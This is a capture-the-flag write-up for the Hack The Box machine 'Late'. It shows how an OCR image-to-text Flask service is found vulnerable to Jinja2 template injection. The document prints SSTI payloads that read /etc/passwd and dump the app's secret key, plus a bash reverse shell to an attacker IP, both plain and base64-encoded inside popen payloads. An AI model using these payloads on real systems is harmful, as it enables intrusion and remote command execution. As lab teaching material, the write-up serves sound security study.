> Author: **[kavigihan][author-profile]**

## Discovery

### Port scanning

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
PORT     STATE         SERVICE
5353/udp open|filtered zeroconf
```

### Enumeration

Directories:

```
/assets               (Status: 301) [Size: 194] [--> http://late.htb/assets/]
/.                    (Status: 301) [Size: 194] [--> http://late.htb/./]
```

Vhosts:

```
Found: images.late.htb (Status: 200) [Size: 2187]
```

### Web browsing

#### The frontpage

The website is promoting an image editing tool:

![][screenshot-frontpage]

There's an emphasis on text fonts:

> "add text to a photo, with your OWN fonts"

Nothing 

#### The image editing webservice

The tool is located at [images.late.htb][webservice-url]:

![][screenshot-webservice]

For some reason the framework is given: Flask.

After uploading a screenshot of itself, the server responds with a "results.txt":

```html
<p>Convert image to textures
If you want to turn an image into a text document, you came to the right place.
Convert your image now!
Choose file Browse
SCAN IMAGE
</p>
```

So the server performs OCR on the image and injects the text in a HTML template.

## Fuzzing

### The file name

To minimize the size of the request, we send a single pixel to the server:

```html
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEAAAAALAAAAAABAAEAAAIBAAA=">
```

The result is 35 bytes:

```
00000000: 4749 4638 3961 0100 0100 0000 0021 f904  GIF89a.......!..
00000010: 0100 0000 002c 0000 0000 0100 0100 0002  .....,..........
00000020: 0100 00
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: images.late.htb' -H $'Content-Length: 213' \
    -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5ryKAss6uBYa1TI2' \
    -H $'Accept-Encoding: gzip, deflate'\
    --data-binary $'------WebKitFormBoundary5ryKAss6uBYa1TI2\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"p.gif\"\x0d\x0aContent-Type: image/gif\x0d\x0a\x0d\x0aGIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01\x00\x00\x0d\x0a------WebKitFormBoundary5ryKAss6uBYa1TI2--\x0d\x0a' \
    $'http://images.late.htb/scanner'
```

But the server rejects GIF:

```
Invalid Extension
```

Which can be bypassed by simply renaming the file without changing its data:

```
Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/p.jpg1725'
```

So the service is running as the user "svc_acc".

The uploads folder cannot be reached though.

Fuzzing for special characters and command injection in the filename fails.

### The image content

Using the Chrome dev tools, we can easily generate images with any text by
editing the webpage itself.

First we insert a HTML tag:

```html
<span>whoami</span>
```

The span has exactly the size on its content so it will produce the smallest
image. Next right click on the element in the dev tool and select "capture node screenshot".

As seen earlier, the OCR recognizes the font of its own page:

```html
<p>whoami
</p>
```

Since it insisted on the framework and the result is in HTML, SSTI comes to mind:

![][ssti-test]

Template injection works:

```html
<p>49
</p>
```

## SSTI exploitation

### Tuning to the OCR

Flask leverages Jinja2, for which [HackTricks][hacktricks] has a wealth of payloads:

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

The server interprets it verbatim:

```
<p>)__[2].__subclasses__()[40](‘/etc/passwd').read() }}
</p>
```

Removing the surrounding brackets and sending the image again results in:

```
<p>"_class__.__mro__[2].__subclasses__()[40]('/etc/passwd’).read()
</p>
```

The OCR is actually making a few mistakes:

- the adjacent single quotes are seen as a double quote
- there are missing dots

The second point can be solved by using bold fonts and a increasing the font size.
Separating the single quotes with a space is enough too.

In the end, wrapping the payload in a `<h4>` tag solves the recognition issues:

```html
<h4 align="center" style="font-weight: bold;">
{{ request | attr ( "application" ) | attr ( "\x5f\x5fglobals\x5f\x5f" ) | attr ( "\x5f\x5fbuiltins\x5f\x5f" ) }}
</h4>
```

### Grabbing 

Starting with a simpler payload like `{{ config.items() }}`:

```
<p>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
</p>
```

After translating the escaped characters back:

```python
dict_items([
    ('ENV', 'production'),
    ('DEBUG', False),
    ('TESTING', False),
    ('PROPAGATE_EXCEPTIONS', None),
    ('PRESERVE_CONTEXT_ON_EXCEPTION', None),
    ('SECRET_KEY', b'_5#y2L"F4Q8z\n\xec]/'),
    ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)),
    ('USE_X_SENDFILE', False),
    ('SERVER_NAME', None),
    ('APPLICATION_ROOT', '/'),
    ('SESSION_COOKIE_NAME', 'session'),
    ('SESSION_COOKIE_DOMAIN', False),
    ('SESSION_COOKIE_PATH', None),
    ('SESSION_COOKIE_HTTPONLY', True),
    ('SESSION_COOKIE_SECURE', False),
    ('SESSION_COOKIE_SAMESITE', None),
    ('SESSION_REFRESH_EACH_REQUEST', True),
    ('MAX_CONTENT_LENGTH', None),
    ('SEND_FILE_MAX_AGE_DEFAULT', None),
    ('TRAP_BAD_REQUEST_ERRORS', None),
    ('TRAP_HTTP_EXCEPTIONS', False),
    ('EXPLAIN_TEMPLATE_LOADING', False),
    ('PREFERRED_URL_SCHEME', 'http'),
    ('JSON_AS_ASCII', True),
    ('JSON_SORT_KEYS', True),
    ('JSONIFY_PRETTYPRINT_REGULAR', False),
    ('JSONIFY_MIMETYPE', 'application/json'),
    ('TEMPLATES_AUTO_RELOAD', None),
    ('MAX_COOKIE_SIZE', 4093)])
```

### Embedding a reverse shell in an image

```shell
bash -i  >& /dev/tcp/10.10.16.4/8888  0>&1
echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC84ODg4ICAwPiYx | base64 -d | bash
```

```shell
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy84ODg4ICAwPiYx | base64 -d | bash")["read"]() %} a {% endwith %}

{{ request.args ) }}

request.application.__globals__.__builtins__.__import__ ( "os" ).popen ( "bash -r ' bash -i >& /dev/tcp/10.10.16.4/8888 0>&1 ' " ).read ( )

{{ request | attr ( 'application' ) | attr ( '__globals__' ) | attr ( '__builtins__' ) | attr ( "__import__" ) ( "os" ) | attr ( "popen" ) }}

{{ request | attr ( "application" ) | attr ( "\x5f\x5fglobals\x5f\x5f" ) | attr ( "\x5f\x5fbuiltins\x5f\x5f" ) | attr ( "\x5f\x5fimport\x5f\x5f" ) ( "os" ) | attr ( "popen" ) }}
```

[author-profile]: https://app.hackthebox.com/users/389926
[hacktricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
[screenshot-frontpage]: images/screenshot-frontpage.png
[screenshot-webservice]: images/screenshot-webservice.png
[ssti-vector]: images/ssti-test.png
[webservice-url]: http://images.late.htb
